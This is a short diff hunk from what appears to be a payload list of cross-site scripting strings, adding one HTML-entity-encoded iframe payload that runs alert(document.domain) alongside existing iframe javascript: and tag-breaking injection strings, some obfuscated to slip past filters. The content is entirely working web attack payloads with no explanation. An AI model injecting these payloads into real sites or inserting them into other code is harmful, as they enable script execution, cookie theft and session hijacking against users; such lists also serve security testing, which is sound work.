@@ -11,7 +11,7 @@
 <IFRAME SRC="javascript:alert('Window.document.cookie');"></IFRAME>
 "><h3><SRC="javascript:alert('xss');">girl</h3>
 <iframe src=javascript&colon;alert&lpar;window&period;document&period;cookie&rpar;>
-
+<iframe src=javascript&colon;alert&lpar;document&period;domain&rpar;>
 
 
 
